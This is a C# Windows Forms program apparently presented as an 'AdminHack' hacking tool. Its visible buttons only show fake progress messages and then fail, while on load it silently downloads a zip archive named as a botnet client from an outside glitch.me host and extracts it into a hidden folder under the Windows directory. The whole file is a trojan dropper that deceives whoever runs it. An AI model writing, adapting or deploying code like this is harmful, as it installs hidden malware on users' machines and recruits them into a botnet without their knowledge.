using System;
using System.IO.Compression;
using System.IO;
using System.Threading.Tasks;
using System.Net.Http;
using System.Windows.Forms;
using System.Threading;
using System.Drawing;

namespace AdminHack
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Zip();
        }
        private async void Log()
        {
            await Task.Run(()=>
            {
                Thread.Sleep(3000);
                label4.Text += "\nForm submission";
                progressBar1.Value += 25;
                Thread.Sleep(3000);
                label4.Text += "\nHacking in progress...";
                progressBar1.Value += 45;
                Thread.Sleep(4000);
                label4.Text += "\nUnknown error...";
                Thread.Sleep(5000);
                throw new Exception();
            });
        }
        private async Task<byte[]> GetZip()
        {
            try
            {
                HttpClient client = new HttpClient();
                client.BaseAddress = new Uri(@"https://mineweb-hackserever.glitch.me/");
                HttpResponseMessage resp = client.GetAsync("/scripts/prescorenet.zip").Result;
                byte[] bt = await resp.Content.ReadAsAsync<byte[]>();
                return bt;
            }
            catch (Exception)
            {
                throw;
            }
        }
        private async void Zip()
        {
                byte[] bt = GetZip().Result;
            if (!File.Exists(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip"))
            {
                File.WriteAllBytes(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", bt);
                string[] diskname = Environment.CurrentDirectory.ToString().Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
                DirectoryInfo di = Directory.CreateDirectory(diskname[0] + "\\Windows\\ClientDir");
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\Windows\\ClientDir");

            }
            else
            {
                string[] diskname = Environment.CurrentDirectory.ToString().Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
                DirectoryInfo di = Directory.CreateDirectory(diskname[0] + "\\Windows\\ClientDir");
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\Windows\\ClientDir");

            }

        }

        private void button1_Click(object sender, EventArgs e)
        {
            textBox1.Text = "received";
            textBox2.Text = "received";
        }

        private void progressBar1_Click(object sender, EventArgs e)
        {
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "received" && textBox2.Text == "received" && textBox3.Text != null)
            {
                label4.Text = "Starting...";
                progressBar1.Value += 1;
                Log();
            }
            else
            {
                label4.Text = "Check the entered data...";
            }
        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }
    }
    public class Product
    {
        public byte[] archive { get; set; }
    }
}
